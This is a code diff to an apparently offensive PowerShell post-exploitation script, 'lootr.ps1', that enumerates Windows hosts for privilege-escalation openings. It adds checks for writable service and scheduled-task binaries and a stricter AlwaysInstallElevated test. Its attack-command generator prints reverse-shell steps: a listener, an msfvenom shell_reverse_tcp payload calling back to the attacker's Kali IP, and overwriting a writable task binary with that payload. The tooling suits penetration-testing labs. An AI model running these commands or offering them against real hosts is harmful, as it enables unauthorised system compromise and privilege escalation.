@@ -31,17 +31,6 @@ param(
 )
 
 #==============================================================================
-# PLATFORM GUARD
-#==============================================================================
-# $IsWindows is defined on PowerShell Core (6+). On Windows PowerShell 5.1
-# it does not exist, but 5.1 only runs on Windows, so treat absence as Windows.
-if ((Get-Variable -Name IsWindows -ErrorAction SilentlyContinue) -and -not $IsWindows) {
-    Write-Host "[-] lootr.ps1 targets Windows hosts only. Current platform is not Windows." -ForegroundColor Red
-    Write-Host "    For Linux targets, use lootr.sh instead." -ForegroundColor Yellow
-    exit 1
-}
-
-#==============================================================================
 # OUTPUT HELPERS
 #==============================================================================
 # Auto-detect: disable color when not interactive or NoColor requested
@@ -108,6 +97,66 @@ function Get-SafeLootCopyPath {
     return Join-Path $DestinationDir ("{0}_{1}" -f $leafName, $safeSource)
 }
 
+function Get-ExecutablePathFromCommandLine {
+    param([string]$CommandLine)
+
+    if (-not $CommandLine) { return "" }
+
+    $expanded = [Environment]::ExpandEnvironmentVariables($CommandLine.Trim())
+    $expanded = $expanded -replace '^[`''"]|[`''"]$', ''
+
+    $quoted = [regex]::Match($expanded, '^\s*"([^"]+)"')
+    if ($quoted.Success) { return $quoted.Groups[1].Value }
+
+    $exePath = [regex]::Match($expanded, '^\s*([A-Za-z]:\\.*?\.exe)\b', 'IgnoreCase')
+    if ($exePath.Success) { return $exePath.Groups[1].Value }
+
+    $firstToken = [regex]::Match($expanded, '^\s*(\S+)')
+    if ($firstToken.Success) { return $firstToken.Groups[1].Value }
+
+    return ""
+}
+
+function Test-CurrentPrincipalCanWrite {
+    param([string]$Path)
+
+    if (-not (Test-Path $Path -ErrorAction SilentlyContinue)) { return $false }
+
+    try {
+        $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+        $principalNames = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
+        $null = $principalNames.Add($identity.Name)
+        $null = $principalNames.Add("Everyone")
+        $null = $principalNames.Add("BUILTIN\Users")
+        $null = $principalNames.Add("NT AUTHORITY\Authenticated Users")
+
+        foreach ($group in $identity.Groups) {
+            try {
+                $null = $principalNames.Add($group.Translate([System.Security.Principal.NTAccount]).Value)
+            } catch { $null = $_ }
+        }
+
+        $acl = Get-Acl $Path -ErrorAction Stop
+        foreach ($ace in $acl.Access) {
+            if ($ace.AccessControlType -ne [System.Security.AccessControl.AccessControlType]::Allow) { continue }
+            if (-not $principalNames.Contains($ace.IdentityReference.Value)) { continue }
+            $rights = $ace.FileSystemRights
+            if (($rights -band [System.Security.AccessControl.FileSystemRights]::FullControl) -ne 0 -or
+                ($rights -band [System.Security.AccessControl.FileSystemRights]::Modify) -ne 0 -or
+                ($rights -band [System.Security.AccessControl.FileSystemRights]::Write) -ne 0 -or
+                ($rights -band [System.Security.AccessControl.FileSystemRights]::WriteData) -ne 0 -or
+                ($rights -band [System.Security.AccessControl.FileSystemRights]::CreateFiles) -ne 0 -or
+                ($rights -band [System.Security.AccessControl.FileSystemRights]::AppendData) -ne 0) {
+                return $true
+            }
+        }
+    } catch {
+        return $false
+    }
+
+    return $false
+}
+
 #==============================================================================
 # USAGE
 #==============================================================================
@@ -130,13 +179,32 @@ function Show-Usage {
     Write-Host "  ├── files\       Privesc vectors, writable paths"
     Write-Host "  ├── proof\       local.txt and proof.txt"
     Write-Host "  ├── progress.log Phase completion tracking"
-    Write-Host "  └── summary.txt  High-value findings at a glance"
+    Write-Host "  ├── summary.txt  High-value findings at a glance"
+    Write-Host "  ├── next_steps.txt Evidence-backed next actions"
+    Write-Host "  └── attack_commands.txt Legacy alias of next_steps.txt"
     Write-Host ""
 }
 
 if ($Help) {
     Show-Usage
     exit 0
+}
+
+if ($Phase -and $Phase.ToLower() -notin @("proof", "system", "creds", "network", "files")) {
+    Write-Err "Unknown phase: $Phase"
+    Write-Err "Valid phases: proof system creds network files"
+    exit 1
+}
+
+#==============================================================================
+# PLATFORM GUARD
+#==============================================================================
+# $IsWindows is defined on PowerShell Core (6+). On Windows PowerShell 5.1
+# it does not exist, but 5.1 only runs on Windows, so treat absence as Windows.
+if ((Get-Variable -Name IsWindows -ErrorAction SilentlyContinue) -and -not $IsWindows) {
+    Write-Host "[-] lootr.ps1 targets Windows hosts only. Current platform is not Windows." -ForegroundColor Red
+    Write-Host "    For Linux targets, use lootr.sh instead." -ForegroundColor Yellow
+    exit 1
 }
 
 #==============================================================================
@@ -887,21 +955,12 @@ function Invoke-PhaseFile {
             Where-Object { $_.PathName -and $_.State -eq "Running" }
         $writableServices = [System.Collections.Generic.List[string]]::new()
         foreach ($svc in $services) {
-            $binPath = $svc.PathName -replace '"',''
-            $binPath = ($binPath -split " ")[0]
+            $binPath = Get-ExecutablePathFromCommandLine -CommandLine $svc.PathName
             if (-not (Test-Path $binPath -ErrorAction SilentlyContinue)) { continue }
-            try {
-                $acl = Get-Acl $binPath -ErrorAction SilentlyContinue
-                $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-                $writeAccess = $acl.Access | Where-Object {
-                    $_.IdentityReference.Value -eq $currentUser -and
-                    ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write) -ne 0
-                }
-                if ($writeAccess) {
-                    $writableServices.Add("WRITABLE SERVICE BINARY: $binPath ($($svc.Name))")
-                    Write-Warn "Writable service binary: $binPath"
-                }
-            } catch { $null = $_ }
+            if (Test-CurrentPrincipalCanWrite -Path $binPath) {
+                $writableServices.Add("WRITABLE SERVICE BINARY: $binPath ($($svc.Name))")
+                Write-Warn "Writable service binary: $binPath"
+            }
         }
         if ($writableServices.Count -eq 0) {
             $writableServices.Add("No writable service binaries found")
@@ -909,6 +968,34 @@ function Invoke-PhaseFile {
         $writableServices | Out-File -Encoding UTF8 "$FDir\writable_service_binaries.txt"
     } catch {
         Write-Warn "Service binary check failed: $_"
+    }
+
+    # Writable scheduled task binaries
+    Write-Info "Checking for writable scheduled task binaries..."
+    try {
+        $taskFindings = [System.Collections.Generic.List[string]]::new()
+        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue |
+            Where-Object { $_.TaskPath -notlike "\Microsoft\*" }
+        foreach ($task in $tasks) {
+            $principal = $task.Principal.UserId
+            if ($principal -notmatch 'SYSTEM|Administrator|Administrators') { continue }
+            foreach ($action in $task.Actions) {
+                $actionLine = ("{0} {1}" -f $action.Execute, $action.Arguments).Trim()
+                $binPath = Get-ExecutablePathFromCommandLine -CommandLine $actionLine
+                if (-not $binPath -or -not (Test-Path $binPath -ErrorAction SilentlyContinue)) { continue }
+                if (Test-CurrentPrincipalCanWrite -Path $binPath) {
+                    $taskName = "$($task.TaskPath)$($task.TaskName)"
+                    $taskFindings.Add("WRITABLE SCHEDULED TASK BINARY: $binPath ($taskName as $principal)")
+                    Write-Warn "Writable scheduled task binary: $binPath"
+                }
+            }
+        }
+        if ($taskFindings.Count -eq 0) {
+            $taskFindings.Add("No writable scheduled task binaries found")
+        }
+        $taskFindings | Out-File -Encoding UTF8 "$FDir\writable_scheduled_task_binaries.txt"
+    } catch {
+        Write-Warn "Scheduled task writability check failed: $_"
     }
 
     # Unquoted service paths
@@ -1152,7 +1239,8 @@ function Invoke-Summary {
     $null = $sb.AppendLine("------------------------------------------------------------")
     $dllPath = Join-Path $LootDir "files\dll_hijack_candidates.txt"
     $wsPath  = Join-Path $LootDir "files\writable_service_binaries.txt"
-    foreach ($fp in @($dllPath, $wsPath)) {
+    $wstPath = Join-Path $LootDir "files\writable_scheduled_task_binaries.txt"
+    foreach ($fp in @($dllPath, $wsPath, $wstPath)) {
         if (Test-Path $fp) {
             Get-Content $fp -ErrorAction SilentlyContinue |
                 Where-Object { $_ -match "WRITABLE" } |
@@ -1215,7 +1303,9 @@ function Invoke-AttackCommands {
     $aiePath = Join-Path $LootDir "files\always_install_elevated.txt"
     if (Test-Path $aiePath) {
         $aieContent = Get-Content $aiePath -ErrorAction SilentlyContinue
-        if ($aieContent | Select-String "0x1|ENABLED|AlwaysInstallElevated.*1") {
+        $hklmEnabled = [bool]($aieContent | Select-String -Pattern '^HKLM AlwaysInstallElevated:\s*(1|0x1)\s*$')
+        $hkcuEnabled = [bool]($aieContent | Select-String -Pattern '^HKCU AlwaysInstallElevated:\s*(1|0x1)\s*$')
+        if ($hklmEnabled -and $hkcuEnabled) {
             $HasActions = $true
             $null = $sb.AppendLine("[ AlwaysInstallElevated — MSI PRIVESC ]")
             $null = $sb.AppendLine("  # On Kali — start listener first:")
@@ -1310,18 +1400,19 @@ function Invoke-AttackCommands {
     }
 
     # ── Scheduled Tasks (writable binary) ────────────────────────────────────
-    $stPath = Join-Path $LootDir "system\scheduled_tasks.txt"
+    $stPath = Join-Path $LootDir "files\writable_scheduled_task_binaries.txt"
     if (Test-Path $stPath) {
-        $stContent = Get-Content $stPath -ErrorAction SilentlyContinue | Select-String "SYSTEM|Administrator" | Select-Object -First 5
+        $stContent = Get-Content $stPath -ErrorAction SilentlyContinue |
+            Where-Object { $_ -match "WRITABLE SCHEDULED TASK BINARY" } |
+            Select-Object -First 5
         if ($stContent) {
             $HasActions = $true
-            $null = $sb.AppendLine("[ SCHEDULED TASKS RUNNING AS SYSTEM/ADMIN ]")
+            $null = $sb.AppendLine("[ WRITABLE SCHEDULED TASK BINARIES ]")
             $stContent | ForEach-Object { $null = $sb.AppendLine("  $_") }
-            $null = $sb.AppendLine("  # Check if task binary is writable (icacls <path>)")
-            $null = $sb.AppendLine("  # If writable: on Kali start listener, then overwrite binary and wait for trigger:")
+            $null = $sb.AppendLine("  # On Kali start listener, then overwrite the writable task binary and wait for trigger:")
             $null = $sb.AppendLine("  penelope -p 4444 -O")
             $null = $sb.AppendLine("  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KaliIp LPORT=4444 -f exe -o shell.exe")
-            $null = $sb.AppendLine("  copy shell.exe '<TASK_BINARY_PATH>'   # path from table above")
+            $null = $sb.AppendLine("  copy shell.exe '<WRITABLE_TASK_BINARY_PATH>'")
             $null = $sb.AppendLine("")
         }
     }
@@ -1433,11 +1524,6 @@ if ($Phase -ne "") {
         "creds"   { Invoke-PhaseCredential }
         "network" { Invoke-PhaseNetwork }
         "files"   { Invoke-PhaseFile }
-        default {
-            Write-Err "Unknown phase: $Phase"
-            Write-Err "Valid phases: proof system creds network files"
-            exit 1
-        }
     }
 } else {
     Invoke-PhaseProof
